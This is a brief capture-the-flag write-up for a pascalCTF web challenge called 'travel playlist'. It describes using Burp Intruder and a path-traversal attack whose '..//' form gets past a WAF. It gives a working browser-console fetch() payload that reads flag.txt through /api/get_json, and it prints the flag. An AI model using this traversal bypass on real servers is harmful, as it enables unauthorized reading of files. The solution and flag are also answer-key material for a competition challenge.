# web - travel playlist

SOLVED by WannaBeMeButTakJadi

travel playlist

i bruteforce with burp intruder and look other than 1-7

i checked in 13 because it have higher response value 

i found /api/get_json actually you can see in network tab

try to exploit with normal lfi ../ got blocked by waf

try better exploit payload ..// it bypassed but i got only pascalCTF

try to read json better then flag was revealed

Flag:`pascalCTF{4ll_1_d0_1s_tr4v3ll1nG_4r0und_th3_w0rld}`

```
payload (paste in console):
fetch('/api/get_json', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({ index: "..//flag.txt" })
})
.then(r => r.text()) // Change this to .text()
.then(data => console.log("THE FLAG IS:", data));
```

Solved by: yappare